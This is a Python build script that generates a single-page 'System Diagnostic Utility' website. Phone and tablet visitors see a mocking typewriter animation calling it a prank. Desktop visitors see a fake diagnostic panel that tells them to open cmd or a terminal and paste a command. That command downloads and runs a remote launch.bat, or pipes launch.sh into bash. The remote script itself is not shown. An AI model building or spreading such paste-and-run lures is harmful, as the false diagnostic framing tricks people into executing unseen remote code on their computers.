#!/usr/bin/env python3
"""
build_web.py
Compiles index.html with:
1. Exact mobile device detection: iPhone, iPad, Android Phone, Android Tablet, Desktop
2. Tailored mobile roasted typewriter terminal with exact pauses, colors, and styling
3. Desktop experience with verified 1-click terminal command box (Windows CMD & macOS/Linux Bash)
4. Embedded Base64 meme images so it requires ZERO external assets or server dependencies
"""

import base64
import glob
import json
import os

MEME_FILES = [
    "10 Funny Versions of Monalisa Trolling the Internet.jpg",
    "45+ Funny History Memes That Aren’t Just For History Buffs.jpg",
    "45036065019418068.jpg",
    "Can’t Believe I Almost Skipped These Historical Gems.jpg",
    "Crazy Funny Pictures.jpg",
    "Dog Meme Look.jpg",
    "Dream.jpg",
    "gif.jpg",
    "Meme Deole.jpg",
    "Meme Pfp Ideas.jpg",
    "Mr bean funny meme.jpg",
    "patrick.jpg",
    "Pitudo Meme.jpg",
    "repost.jpg",
    "Results for quiz I judge ur music taste.jpg",
    "shocked.jpg",
    "What I look like 99% of the time.jpg",
    "WHO.jpg"
]

def load_memes_base64():
    memes_data = []
    for fname in MEME_FILES:
        target_path = None
        for sdir in ["memes", "."]:
            cand = os.path.join(sdir, fname)
            if os.path.exists(cand):
                target_path = cand
                break
            pattern = os.path.join(sdir, fname.replace("’", "*").replace("'", "*"))
            matches = glob.glob(pattern)
            if matches:
                target_path = matches[0]
                break
        if target_path and os.path.exists(target_path):
            with open(target_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("utf-8")
                memes_data.append({
                    "name": os.path.basename(target_path),
                    "data": f"data:image/jpeg;base64,{b64}",
                    "size": os.path.getsize(target_path)
                })
    return memes_data

def build():
    memes = load_memes_base64()
    print(f"Loaded {len(memes)} meme images into memory.")
    memes_json = json.dumps(memes)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Diagnostic Utility</title>
<style>
  * {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    -webkit-user-select: none;
    user-select: none;
    -webkit-touch-callout: none;
  }}
  html, body {{
    width: 100%;
    height: 100%;
    background-color: #040608;
    color: #00e650;
    font-family: Consolas, "Courier New", "Liberation Mono", monospace;
    overflow: hidden;
    position: fixed;
  }}

  /* Mobile / Tablet Fullscreen Terminal */
  #mobile-terminal {{
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    height: 100dvh;
    padding: 24px 20px;
    background: #040608;
    color: #00e650;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    z-index: 99999;
  }}
  #mobile-terminal::before {{
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: repeating-linear-gradient(
      0deg,
      rgba(0, 0, 0, 0.15),
      rgba(0, 0, 0, 0.15) 1px,
      transparent 1px,
      transparent 2px
    );
    pointer-events: none;
    z-index: 10;
  }}
  .term-content {{
    width: 100%;
    max-width: 680px;
    margin: 0 auto;
    font-size: clamp(14px, 4.2vw, 17px);
    line-height: 1.6;
    letter-spacing: 0.5px;
    word-break: break-word;
    white-space: pre-wrap;
    display: block;
    min-height: 100%;
    padding-bottom: 70px;
  }}
  .term-line {{
    margin-bottom: 4px;
    color: #00e650;
  }}
  .term-line.highlight {{
    color: #ffffff;
    font-weight: bold;
  }}
  .term-line.alert {{
    color: #ff3232;
    font-weight: bold;
  }}
  .term-line.warning {{
    color: #ffd228;
    font-weight: bold;
  }}
  .term-line.dim {{
    color: #557760;
  }}
  .cursor {{
    display: inline-block;
    width: 9px;
    height: 16px;
    background-color: #00e650;
    vertical-align: middle;
    margin-left: 3px;
    animation: blink 0.8s infinite;
  }}
  @keyframes blink {{
    0%, 49% {{ opacity: 1; }}
    50%, 100% {{ opacity: 0; }}
  }}

  /* Desktop Container */
  #desktop-container {{
    display: none;
    width: 100vw;
    height: 100vh;
    position: relative;
    background: #040608;
  }}
  #desktop-canvas {{
    width: 100%;
    height: 100%;
    display: block;
  }}
  #desktop-launcher {{
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 640px;
    max-width: 92%;
    background: #0a0e13;
    border: 2px solid #00e650;
    padding: 30px;
    box-shadow: 0 0 35px rgba(0, 230, 80, 0.2);
    text-align: left;
    z-index: 100;
  }}
  .dt-title {{
    font-size: 20px;
    color: #00e650;
    margin-bottom: 16px;
    border-bottom: 1px solid #1a3320;
    padding-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }}
  .dt-row {{
    font-size: 14px;
    color: #8bb396;
    margin-bottom: 10px;
    line-height: 1.4;
  }}
  .dt-row span.ok {{
    color: #00e650;
  }}
  .os-tabs {{
    display: flex;
    gap: 8px;
    margin-top: 16px;
    margin-bottom: 6px;
  }}
  .os-tab {{
    flex: 1;
    background: #080d0a;
    border: 1px solid #1a3320;
    color: #557760;
    padding: 8px 12px;
    font-family: inherit;
    font-size: 12px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
  }}
  .os-tab.active {{
    background: #0f1c14;
    border-color: #00e650;
    color: #00e650;
    box-shadow: 0 0 10px rgba(0, 230, 80, 0.25);
  }}
  .cmd-box {{
    background: #040608;
    border: 1px solid #1a3320;
    border-left: 3px solid #00e650;
    color: #00e650;
    font-family: Consolas, "Courier New", monospace;
    font-size: 13px;
    padding: 14px;
    margin: 10px 0 14px 0;
    line-height: 1.4;
    word-break: break-all;
    -webkit-user-select: all;
    user-select: all;
  }}
  .copy-btn {{
    width: 100%;
    background: #0f1c14;
    border: 1px solid #00e650;
    color: #00e650;
    padding: 14px 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
    letter-spacing: 0.5px;
  }}
  .copy-btn:hover {{
    background: #00e650;
    color: #040608;
    box-shadow: 0 0 18px rgba(0, 230, 80, 0.4);
  }}
  .cmd-hint {{
    margin-top: 14px;
    font-size: 12px;
    color: #72967b;
    line-height: 1.5;
  }}
  .cmd-hint b {{
    color: #00e650;
  }}
</style>
</head>
<body>

<!-- Mobile / Tablet Roaster Terminal -->
<div id="mobile-terminal">
  <div class="term-content" id="mobile-content">
    <div id="typed-lines"></div>
    <div id="active-line"><span id="current-text"></span><span class="cursor"></span></div>
  </div>
</div>

<!-- Desktop Container -->
<div id="desktop-container">
  <canvas id="desktop-canvas"></canvas>

  <!-- Initial Desktop Verification / Terminal Command Display -->
  <div id="desktop-launcher">
    <div class="dt-title">&gt; SYSTEM DIAGNOSTIC FRAMEWORK</div>
    <div class="dt-row">&gt; HARDWARE AUDIT: <span class="ok">[OK] DESKTOP / LAPTOP VERIFIED</span></div>
    <div class="dt-row">&gt; ARCHITECTURE: <span class="ok">[OK] REAL TERMINAL READY</span></div>

    <!-- OS Selection Tabs -->
    <div class="os-tabs">
      <button class="os-tab active" id="tab-win">&gt; WINDOWS (CMD)</button>
      <button class="os-tab" id="tab-unix">&gt; MACOS &amp; LINUX (BASH)</button>
    </div>
    
    <div class="cmd-box" id="cmd-display">curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" &amp;&amp; "%TEMP%\\launch.bat"</div>

    <button class="copy-btn" id="btn-copy">&gt; CLICK TO COPY COMMAND</button>

    <div class="cmd-hint" id="cmd-hint">
      &gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>
      &gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.
    </div>
  </div>
</div>

<script>
// Embedded meme assets
const MEME_ASSETS = {memes_json};

/* ==========================================================================
   DEVICE DETECTION
   ========================================================================== */
function detectDevice() {{
  const ua = navigator.userAgent || '';
  const platform = navigator.platform || '';
  const maxTouchPoints = navigator.maxTouchPoints || 0;

  // 1. iPhone / iPod
  if (/iPhone|iPod/i.test(ua)) {{
    return 'iphone';
  }}

  // 2. iPad: checks classic iPad UA or modern iPadOS reporting as MacIntel/Macintosh with touchpoints
  const isIPadOS = (platform === 'MacIntel' || platform === 'Macintosh' || /Macintosh/i.test(ua)) && maxTouchPoints > 1 && !window.MSStream;
  if (/iPad/i.test(ua) || isIPadOS) {{
    return 'ipad';
  }}

  // 3. Android devices
  if (/Android/i.test(ua)) {{
    // Android phones have "Mobile" in user-agent string; tablets do not
    if (/Mobile/i.test(ua) || (Math.min(window.screen.width, window.screen.height) < 600 && maxTouchPoints > 0)) {{
      return 'android-phone';
    }} else {{
      return 'android-tablet';
    }}
  }}

  // 4. Other mobile checks
  if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {{
    return 'android-phone';
  }}

  // 5. Desktop / Laptop
  return 'desktop';
}}

/* ==========================================================================
   MOBILE ROAST SCRIPTS & TYPEWRITER PACING
   ========================================================================== */
const IPHONE_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 20, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 20, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 20, pause: 400 }},
  {{ text: "> DEVICE DETECTED: IPHONE", speed: 24, pause: 800, highlight: true }},
  {{ text: "> WAIT.", speed: 45, pause: 850, warning: true }},
  {{ text: "> YOU OPENED THIS ON A PHONE? 💀", speed: 38, pause: 1400, alert: true }},
  {{ text: "> THIS IS A COMPUTER PRANK.", speed: 35, pause: 850, highlight: true }},
  {{ text: "> NOT A TIKTOK FILTER.", speed: 28, pause: 450 }},
  {{ text: "> NOT INSTAGRAM.", speed: 28, pause: 450 }},
  {{ text: "> NOT A SCREENSHOT.", speed: 28, pause: 600 }},
  {{ text: "> A. COMPUTER.", speed: 48, pause: 1000, highlight: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> PROCESSING...", speed: 20, pause: 400 }},
  {{ text: "> PROCESSING...", speed: 20, pause: 400 }},
  {{ text: "> PROCESSING...", speed: 20, pause: 700 }},
  {{ text: "> CONCLUSION:", speed: 28, pause: 700, highlight: true }},
  {{ text: "> YOU PAID ALL THAT MONEY...", speed: 40, pause: 850, warning: true }},
  {{ text: "> JUST TO GET EXCLUDED. 😭", speed: 45, pause: 1500, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> MOBILE DEVICE STATUS:", speed: 24, pause: 400, highlight: true }},
  {{ text: "> ❌ INSUFFICIENT CHAOS", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT SCREEN", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT KEYBOARD", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT COMMON SENSE", speed: 28, pause: 650, alert: true }},
  {{ text: "> ERROR 404:", speed: 28, pause: 300, alert: true }},
  {{ text: "> COMMON SENSE NOT FOUND.", speed: 35, pause: 850, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> NICE TRY THOUGH.", speed: 32, pause: 750 }},
  {{ text: "> COME BACK WITH A KEYBOARD. 💀", speed: 38, pause: 1200, highlight: true }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 24, pause: 700, dim: true }},
  {{ text: "> BYE.", speed: 45, pause: 3000, highlight: true }}
];

const IPAD_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 20, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 20, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 20, pause: 400 }},
  {{ text: "> DEVICE DETECTED: IPAD", speed: 24, pause: 800, highlight: true }},
  {{ text: "> WAIT.", speed: 45, pause: 850, warning: true }},
  {{ text: "> BIGGER SCREEN.", speed: 38, pause: 850, highlight: true }},
  {{ text: "> STILL NOT A COMPUTER. 💀", speed: 45, pause: 1400, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> YOU MADE IT BIGGER...", speed: 35, pause: 750 }},
  {{ text: "> BUT YOU STILL DIDN'T BRING A KEYBOARD.", speed: 40, pause: 1200, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> TABLET STATUS:", speed: 24, pause: 400, highlight: true }},
  {{ text: "> ❌ TOO BIG FOR MOBILE", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ TOO SMALL FOR THE SHOW", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ COMMON SENSE NOT FOUND", speed: 28, pause: 650, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> NICE TRY.", speed: 32, pause: 750 }},
  {{ text: "> COME BACK WITH A REAL COMPUTER. 😭", speed: 40, pause: 1400, alert: true }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 24, pause: 700, dim: true }},
  {{ text: "> BYE.", speed: 45, pause: 3000, highlight: true }}
];

const ANDROID_PHONE_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 20, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 20, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 20, pause: 400 }},
  {{ text: "> DEVICE DETECTED: ANDROID PHONE", speed: 24, pause: 800, highlight: true }},
  {{ text: "> NICE TRY, NPC. 💀", speed: 40, pause: 1300, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> THIS PRANK REQUIRES A REAL COMPUTER.", speed: 34, pause: 850, highlight: true }},
  {{ text: "> YOUR PHONE IS NOT READY FOR THIS LEVEL OF CHAOS.", speed: 34, pause: 1200, warning: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> MOBILE STATUS:", speed: 24, pause: 400, highlight: true }},
  {{ text: "> ❌ KEYBOARD NOT FOUND", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ DESKTOP MODE NOT FOUND", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ COMMON SENSE NOT FOUND", speed: 28, pause: 650, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> COME BACK WITH A KEYBOARD.", speed: 34, pause: 850, highlight: true }},
  {{ text: "> WE'LL PRETEND THIS NEVER HAPPENED. 😭", speed: 40, pause: 1400, alert: true }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 24, pause: 800, dim: true }}
];

const ANDROID_TABLET_SCRIPT = [
  {{ text: "> SYSTEM CHECK INITIALIZED...", speed: 20, pause: 300 }},
  {{ text: "> ANALYZING DEVICE...", speed: 20, pause: 300 }},
  {{ text: "> SCANNING HARDWARE...", speed: 20, pause: 400 }},
  {{ text: "> DEVICE DETECTED: ANDROID TABLET", speed: 24, pause: 800, highlight: true }},
  {{ text: "> ABSOLUTELY NOT.", speed: 45, pause: 900, alert: true }},
  {{ text: "> YOU MADE IT BIGGER...", speed: 34, pause: 750 }},
  {{ text: "> BUT YOU STILL DIDN'T MAKE IT A COMPUTER. 💀", speed: 40, pause: 1400, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> TABLET STATUS:", speed: 24, pause: 400, highlight: true }},
  {{ text: "> ❌ INSUFFICIENT CHAOS", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT KEYBOARD", speed: 24, pause: 350, alert: true }},
  {{ text: "> ❌ INSUFFICIENT COMMON SENSE", speed: 28, pause: 650, alert: true }},
  {{ text: "> ------------------------------------", speed: 8, pause: 350, dim: true }},
  {{ text: "> NICE TRY.", speed: 34, pause: 750 }},
  {{ text: "> COME BACK WITH A COMPUTER.", speed: 40, pause: 1200, highlight: true }},
  {{ text: "> TERMINATING MOBILE SESSION...", speed: 24, pause: 800, dim: true }}
];

/* ==========================================================================
   TYPEWRITER ENGINE FOR MOBILE / TABLET
   ========================================================================== */
function runMobileTerminal(script) {{
  const term = document.getElementById("mobile-terminal");
  const desktopCont = document.getElementById("desktop-container");
  if (desktopCont) desktopCont.style.display = "none";
  term.style.display = "block";

  const typedLines = document.getElementById("typed-lines");
  const currentTextSpan = document.getElementById("current-text");
  const content = document.getElementById("mobile-content");

  let lineIdx = 0;
  let charIdx = 0;

  function typeChar() {{
    if (lineIdx >= script.length) {{
      return; // Completed, stops mobile prank cleanly
    }}

    const cur = script[lineIdx];
    const text = cur.text || "";

    if (text.length === 0) {{
      // Blank line
      const div = document.createElement("div");
      div.className = "term-line";
      div.innerHTML = "&nbsp;";
      typedLines.appendChild(div);
      lineIdx++;
      setTimeout(typeChar, cur.pause || 200);
      return;
    }}

    if (charIdx < text.length) {{
      currentTextSpan.textContent = text.substring(0, charIdx + 1);
      charIdx++;
      term.scrollTop = term.scrollHeight;
      window.scrollTo(0, document.body.scrollHeight);
      setTimeout(typeChar, cur.speed || 25);
    }} else {{
      // Finished current line
      const div = document.createElement("div");
      div.className = "term-line" +
        (cur.highlight ? " highlight" : "") +
        (cur.alert ? " alert" : "") +
        (cur.warning ? " warning" : "") +
        (cur.dim ? " dim" : "");
      div.textContent = text;
      typedLines.appendChild(div);
      currentTextSpan.textContent = "";
      charIdx = 0;
      lineIdx++;
      term.scrollTop = term.scrollHeight;
      window.scrollTo(0, document.body.scrollHeight);
      setTimeout(typeChar, cur.pause || 400);
    }}
  }}

  setTimeout(typeChar, 350);
}}

/* ==========================================================================
   DESKTOP LAUNCHER CONTROLLER
   ========================================================================== */
function initDesktop() {{
  const desktopContainer = document.getElementById("desktop-container");
  const mobileTerminal = document.getElementById("mobile-terminal");
  if (mobileTerminal) mobileTerminal.style.display = "none";
  desktopContainer.style.display = "block";

  const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
  const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';

  const tabWin = document.getElementById("tab-win");
  const tabUnix = document.getElementById("tab-unix");
  const cmdDisplay = document.getElementById("cmd-display");
  const cmdHint = document.getElementById("cmd-hint");
  const copyBtn = document.getElementById("btn-copy");

  let currentCmd = WIN_CMD;

  function setTab(os) {{
    if (os === "unix") {{
      tabUnix.classList.add("active");
      tabWin.classList.remove("active");
      currentCmd = UNIX_CMD;
      cmdDisplay.textContent = UNIX_CMD;
      cmdHint.innerHTML = '&gt; <b>Step 1:</b> Open <b>Terminal</b> (Cmd + Space &rarr; Terminal on Mac, or Ctrl + Alt + T on Linux).<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
    }} else {{
      tabWin.classList.add("active");
      tabUnix.classList.remove("active");
      currentCmd = WIN_CMD;
      cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
      cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
    }}
  }}

  tabWin.addEventListener("click", () => {{
    setTab("win");
  }});

  tabUnix.addEventListener("click", () => {{
    setTab("unix");
  }});

  // Auto-detect Mac / Linux
  const plat = navigator.platform || '';
  const ua = navigator.userAgent || '';
  if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {{
    setTab("unix");
  }} else {{
    setTab("win");
  }}

  copyBtn.addEventListener("click", () => {{
    const textToCopy = currentCmd;
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(textToCopy).then(() => {{
        copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
        copyBtn.style.background = "#00e650";
        copyBtn.style.color = "#040608";
        setTimeout(() => {{
          copyBtn.textContent = "> CLICK TO COPY COMMAND";
          copyBtn.style.background = "#0f1c14";
          copyBtn.style.color = "#00e650";
        }}, 2500);
      }});
    }} else {{
      const ta = document.createElement("textarea");
      ta.value = textToCopy;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
      copyBtn.style.background = "#00e650";
      copyBtn.style.color = "#040608";
      setTimeout(() => {{
        copyBtn.textContent = "> CLICK TO COPY COMMAND";
        copyBtn.style.background = "#0f1c14";
        copyBtn.style.color = "#00e650";
      }}, 2500);
    }}
  }});
}}

/* ==========================================================================
   INITIALIZATION ROUTER
   ========================================================================== */
function runRouter() {{
  const device = detectDevice();
  console.log("Device detection result:", device);

  if (device === "iphone") {{
    runMobileTerminal(IPHONE_SCRIPT);
  }} else if (device === "ipad") {{
    runMobileTerminal(IPAD_SCRIPT);
  }} else if (device === "android-phone") {{
    runMobileTerminal(ANDROID_PHONE_SCRIPT);
  }} else if (device === "android-tablet") {{
    runMobileTerminal(ANDROID_TABLET_SCRIPT);
  }} else {{
    initDesktop();
  }}
}}

if (document.readyState === "loading") {{
  document.addEventListener("DOMContentLoaded", runRouter);
}} else {{
  runRouter();
}}
</script>
</body>
</html>
"""

    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    size_kb = os.path.getsize("index.html") / 1024
    print(f"Successfully generated index.html ({size_kb:.1f} KB)")

if __name__ == "__main__":
    build()
